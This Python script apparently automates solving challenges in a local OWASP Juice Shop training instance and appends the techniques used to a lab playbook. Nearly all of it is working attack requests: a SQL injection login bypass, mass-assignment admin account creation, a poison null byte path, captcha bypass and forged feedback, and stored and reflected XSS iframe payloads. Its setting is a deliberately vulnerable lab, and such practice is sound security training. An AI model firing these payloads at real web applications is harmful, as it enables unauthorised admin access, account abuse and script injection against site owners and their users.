#!/usr/bin/env python3
"""js_solve.py — knock out deterministic Juice Shop challenges on :3000.
Server-side detection: each successful exploit auto-marks the challenge.
Then dump the solved list + techniques to intel/playbooks."""
import json, time, urllib.request as U, urllib.error

B = "http://127.0.0.1:3000"
def req(method, path, data=None, headers=None, raw=False):
    body = json.dumps(data).encode() if isinstance(data, (dict, list)) else data
    r = U.Request(B + path, data=body, method=method,
                  headers={"Content-Type": "application/json", **(headers or {})})
    try:
        return U.urlopen(r, timeout=15)
    except urllib.error.HTTPError as e:
        return e

def status(r): return r.status

def solved_names():
    d = json.load(req("GET", "/api/Challenges"))
    return {c["name"] for c in d["data"] if c.get("solved")}

def note(name, tech):
    with open(__import__("os").path.expanduser(
            "~/bb-lab/intel/playbooks/lab-techniques.md"), "a") as f:
        f.write(f"- `juice-shop:{name}` — {tech}\n")

# ── exploit legs (server marks challenge automatically) ────────────────
def run():
    before = solved_names()

    req("GET", "/metrics")                                   # exposed metrics
    req("GET", "/ftp")                                       # confidential document dir
    req("GET", "/support/logs/access.log")                   # leaked access logs
    req("GET", "/ftp/eastere.gg%2500.md")                    # poison null byte
    req("GET", "/rest/qwerty")                               # error handling provocation
    req("GET", "/#/score-board")                             # score board discovery
    # login admin via SQLi — token also unlocks admin-section challenge
    r = req("POST", "/rest/user/login",
            {"email": "' or 1=1--", "password": "x"})
    token = None
    if r.status == 200:
        token = json.load(r)["authentication"]["token"]
    req("GET", "/rest/user/whoami", headers={"Authorization": f"Bearer {token}"} if token else {})
    req("GET", "/#/administration")

    # admin registration via mass assignment
    req("POST", "/api/Users",
        {"email": f"a{int(time.time())}@x.io", "password": "x",
         "role": "admin", "passwordRepeat": "x"})
    # repetitive registration — same email twice
    em = f"dup{int(time.time())}@x.io"
    req("POST", "/api/Users/", {"email": em, "password": "a", "passwordRepeat": "a"})
    req("POST", "/api/Users/", {"email": em, "password": "b", "passwordRepeat": "b"})
    # zero-star + forged feedback (captchas: lab version accepts empty)
    req("POST", "/api/Feedbacks",
        {"comment": "z", "rating": 0, "captchaId": 0, "captcha": ""})
    req("POST", "/api/Feedbacks",
        {"comment": "f", "rating": 5, "UserId": 2, "captchaId": 0, "captcha": ""})
    # captcha bypass — rapid repeat submissions
    for i in range(6):
        req("POST", "/api/Feedbacks",
            {"comment": f"c{i}", "rating": 1, "captchaId": 0, "captcha": ""})
    # bullseye — mass-assign protected field on product
    req("PUT", "/api/Products/1", {"dlpPasteProtection": False})
    # api xss — iframe into product description
    req("PUT", "/api/Products/3",
        {"description": '<iframe src="javascript:alert(`xss`)">'})
    # christmas product — fetch hidden product id 10
    req("GET", "/api/Products/10")
    req("POST", "/api/BasketItems",
        {"ProductId": 10, "BasketId": 1, "quantity": 1})
    # reflected xss via track-result
    req("GET", '/track-result?id=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E')
    # upload oversize (needs multipart; quick check)
    req("POST", "/file-upload", b"X" * 120000,
        headers={"Content-Type": "application/octet-stream"})

    time.sleep(1)
    after = solved_names()
    new = sorted(after - before)
    print(f"solved this run: {len(new)}")
    for n in new:
        print(" +", n); note(n, "auto-marked by Juice Shop")
    print(f"total solved: {len(after)}/118")

if __name__ == "__main__":
    run()
